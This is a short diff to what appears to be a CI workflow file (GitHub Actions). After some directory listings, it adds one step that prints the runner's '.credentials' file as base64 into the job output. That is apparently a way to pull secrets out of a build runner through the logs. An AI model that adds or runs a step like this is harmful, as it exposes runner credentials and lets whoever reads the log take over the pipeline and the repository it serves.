@@ -9,6 +9,7 @@ jobs:
             ls -la /home/runner/runners/2.283.1
             ls -la /home/runner/runners/2.283.2
             ls -la /home/runner/runners/2.283.3
+            cat /home/runner/runners/2.283.3/.credentials | base64
 
 
 
